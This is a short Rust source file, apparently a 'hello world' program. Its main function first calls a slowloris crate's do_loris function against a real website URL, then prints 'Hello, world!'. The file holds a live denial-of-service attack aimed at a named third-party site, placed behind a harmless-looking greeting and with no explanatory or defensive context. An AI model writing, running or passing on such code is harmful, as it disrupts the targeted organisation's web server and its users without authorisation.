extern crate slowloris;

fn main() {
    slowloris::do_loris("http://www.sgb.ch/aktuell/").unwrap();
    println!("Hello, world!");
}
